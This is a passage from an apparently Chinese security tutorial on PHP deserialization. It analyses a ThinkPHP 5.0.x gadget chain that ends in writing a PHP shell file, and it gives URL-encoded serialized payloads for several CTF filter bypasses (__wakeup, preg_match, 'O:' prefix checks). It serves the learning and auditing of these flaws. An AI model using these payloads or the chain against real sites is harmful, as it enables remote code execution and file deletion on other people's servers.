>  
>  
>            如果需要增加新的根命名空间，有两种方式：注册新的根命名空间或者放入`EXTEND_PATH`目录（自动注册）。
>  
>
> thinkphp/library/think 这个就是tp的关键类库,也是们构造反序列化链的核心代码区域。
**3.tp的类自动加载机制**
详细内容参考官方文档的: [自动加载](http://jinhuajuanke.cn/manual/tp5manual/115.html)
> 原理就是根据类的命名空间定位到类库文件
>
> 然后我们创建实例的时候系统会自动加载这个类库进来。
>
> example:
>
> 框架的Library目录下面的命名空间都可以自动识别和定位，例如：
>
>   1. `├─Library 框架类库目录`
>   2. `│ ├─Think 核心Think类库包目录`
>   3. `│ ├─Org Org类库包目录`
>   4. `│ ├─ ... 更多类库目录`
>
>
> Library目录下面的子目录都是一个根命名空间，也就是说以Think、Org为根命名空间的类都可以自动加载：
>
>   1. `new ThinkCacheDriverFile();`
>   2. `new OrgUtilAuth();`
>
>
> 都可以自动加载对应的类库文件,后面构造POC的时候会再次涉及到这个知识点。
###  0x3.3 尝试分析5.0.x反序列化
笔者环境: Mac OS, phpstorm
类库搜索:`__destruct`
定位到入口:`/tp5024/thinkphp/library/think/process/pipes/Windows.php`
    public function __destruct()
    {
        $this->close();
        $this->removeFiles();//跟进这个函数
    }
        private function removeFiles()
        {
            foreach ($this->files as $filename) {
                if (file_exists($filename)) { //这里可以触发__toString
                    @unlink($filename);//这里可以反序列删除任意文件
                }
            }
            $this->files = [];
        }
我们接着可以全局搜索下有没有合适的`__toString`方法
`tp5024/thinkphp/library/think/Model.php`
        public function __toString()
        {
            return $this->toJson();
        }
        public function toJson($options = JSON_UNESCAPED_UNICODE)
        {
            return json_encode($this->toArray(), $options); //跟进
        }
我们需要控制两个值:`$modelRelation` and `$value`,这里其实具体还是比较复杂的,
这里我们假设可以任意控制,先理解清楚后面的写`shell`流程,掌握主干的方向。
通过控制`$modelRelation`我们可以走到`$value-getAttr($attr)`,其中`$value`也是我们可以控制的,我们将其控制为`thinkconsoleconsole`的对象,最终进入到了
`thinkphp/library/think/console/Output.php`
因为不存在`getAttr`方法从而调用了`__call`
        public function __call($method, $args)
        {
            if (in_array($method, $this->styles)) {
                array_unshift($args, $method);
                return call_user_func_array([$this, 'block'], $args);
              //跟进这个函数调用
            }
    ............
        }
        protected function block($style, $message)
        {
            $this->writeln("{$message}");//继续跟进
        }
        public function writeln($messages, $type = self::OUTPUT_NORMAL)
        {
            $this->write($messages, true, $type);//跟进
        }
        public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)
        {
            $this->handle->write($messages, $newline, $type);
        }
当来到这里的时候`$this-handle`我们是可以控制的,但是我们一直可以控制的参数值只有一个那就是上面的`$messages`,其他的参数值没办法控制
    namespace thinkconsole{
        class Output{
            private $handle = 这里可以控制为任意对象;
            protected $styles = [
                'getAttr'
            ];
        }
    }
这里我们选择控制为`thinksessiondriverMemcached`的对象然后调用他的`write`方法
`tp5024/thinkphp/library/think/session/driver/Memcached.php`
        public function write($sessID, $sessData)
        {
            return $this->handler->set($this->config['session_name'] . $sessID, $sessData, $this->config['expire']);//跟进看看
        }
这里是关键写入shell的地方,我们从`file_put_contents`反向溯源`$filename`and`data`,看下数据是怎么流向的。
        public function set($name, $value, $expire = null) 
        {
            //$value 我们没办法控制
            if (is_null($expire)) {
                $expire = $this->options['expire'];
            }
            if ($expire instanceof DateTime) {
                $expire = $expire->getTimestamp() - time();
            }
            $filename = $this->getCacheKey($name, true);
            if ($this->tag && !is_file($filename)) {
                $first = true;
            }
            $data = serialize($value);
            if ($this->options['data_compress'] && function_exists('gzcompress')) {
                //数据压缩
                $data = gzcompress($data, 3);
            }
            $data   = "n" . $data;
            $result = file_put_contents($filename, $data);
            if ($result) {
                isset($first) && $this->setTagItem($filename);
                clearstatcache();
                return true;
            } else {
                return false;
            }
        }
第一次我们是没办法控制写入的内容,但是这里进行了二次写入
`$this->setTagItem($filename)`,跟进看看
        protected function setTagItem($name)
        {
            if ($this->tag) {
                $key       = 'tag_' . md5($this->tag);
                $this->tag = null;
                if ($this->has($key)) {
                    $value   = explode(',', $this->get($key));
                    $value[] = $name;
                    $value   = implode(',', array_unique($value));
                } else {
                    $value = $name; //这里$value可以被我们控制
                }
                $this->set($key, $value, 0);//这里再次进行了写入
            }
        }
最终的指向效果就是:
生成的shell文件名就是:
`3b11e4b835d256cc6365eaa91c09a33f.php`
上面介绍了反序列化的主要流程
下一篇文章我会着重讲下该POC的构造过程,探究下优化的可能性。
## 0x4 CTF中反序列化的考点
打了几场比赛, 顺便总结下CTF中反序列化经常考的点, 这些点有可能今后在实战审计中用到, 因为这些点正是一些cms的防护被绕过的例子。
###  0x4.1 __wakeup 绕过
通过前面我们可以知道反序列化的时候会自动触发`__wakeup`,所以有些程序猿在这个函数做了些安全检查。
    file = 'hacker';
        }
        public function __destruct()
        {
            if($this->file !== 'hacker'){
                echo "flag{success!}";
            }else
            {
                echo "try again!";
            }
        }
    }
    $obj = new Record();
    $obj->file = 'boy';
    echo urlencode(serialize($obj));
    // vuln
    unserialize($_GET['c']);
    ?>
    O%3A6%3A%22Record%22%3A0%3A%7B%7D
    // 解码后
    O:6:"Record":0:{}
这里我们反序列化的时候,修改下对象的属性值数目,就可以绕过
    O:6:"Record":0:{}
    //修改后
    O:6:"Record":1:{}
    //编码后
    O%3a6%3a%22record%22%3a1%3a%7b%7d
成员属性值数目大于真实的数目,便能不触发`__wakeup`方法,实现绕过
### 0x4.2 绕过`preg_match('/[oc]:d+:/i',$cmd`
    file = 'hacker';
        }
        public function __destruct()
        {
            var_dump("i am __destruct");
        }
    }
    $obj = new Record();
    echo urlencode(serialize($obj));
    // vuln
    if (preg_match('/[oc]:d+:/i',$_GET['c']))
    {
        die('what?');
    }else
    {
        var_dump("Hello");
        unserialize($_GET['c']);
    }
    ?>
这个是其他师傅fuzz出来的一个小技巧,对象长度可以添加个`+`来绕过正则
    O:6:"Record":0:{}
    //修改后
    O:+6:"Record":1:{}
    //编码后
    O%3a%2b6%3a%22record%22%3a1%3a%7b%7d
### 0x4.3 绕过`substr($c, 0, 2)!=='O:'`
这个限制当时在华中赛区的时候还卡了我一下, 就是限制了开头不能为对象类型,
不过这道题目之前腾讯的某个ctf出过,所以难度不是很大,这里记录下数组绕过的方法
    file = 'hacker';
        }
        public function __destruct()
        {
            var_dump("i am __destruct");
        }
    }
    $obj = new Record();
    //数组化
    $a = array($obj);
    echo urlencode(serialize($a));
    // vuln
    if (substr($_GET['c'], 0, 2)=='O:')
    {
        die('what?');
    }else
    {
        var_dump("Hello");
        unserialize($_GET['c']);
    }
    ?>
    O:6:"Record":0:{}
    //修改后
    a:1:{i:0;O:6:"Record":1:{}}
    //编码后
    a%3A1%3A%7Bi%3A0%3BO%3A6%3A%22Record%22%3A1%3A%7B%7D%7D
反序列化的时候他是会从反序列化数组里面的内容的。
###  0x4.4 反序列化的字符逃逸
这个内容我接触的可能比较少, 是一些有点偏的特性,这里分享几篇资料,读者有兴趣可以自行研究或者与我一起探讨下:
[详解PHP反序列化中的字符逃逸](https://xz.aliyun.com/t/6718)
[一道ctf题关于php反序列化字符逃逸](http://www.lin2zhen.top/index.php/archives/73/)
其实原理简单来说就是:
就是序列化数据拼接的时候容错机制导致的问题,导致了可以伪造序列化数据内容。
## 0x5 总结
PHP的反序列化学习起来比python、java那些反而更加简单和直接,
非常适合萌新选手入门反序列化前掌握反序列化思想,同样其利用方面也是极具威胁性的，毕竟使用框架的cms那么多，就算不使用框架，也一样会存在风险。随着后期发展，我感觉反序列化漏洞会超越传统SQL注入、任意文件上传等主流的高危漏洞,
欢迎师傅们与我一起探讨深入研究各种相关骚操作。
## 0x6 参考链接
[PHP反序列化原理及漏洞解析](https://cjjkkk.github.io/phpUnserialize/)
[ ThinkPHP v5.0.x 反序列化利用链挖掘](https://www.anquanke.com/post/id/196364)
[命名空间自动加载](https://www.cnblogs.com/furuihua/p/11759779.html)
[ThinkPHP反序列化pop链分析](//passingfoam.com/2019/09/13/ThinkPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E5%88%86%E6%9E%90/))
[PHP 内核层解析反序列化漏洞](https://paper.seebug.org/866/)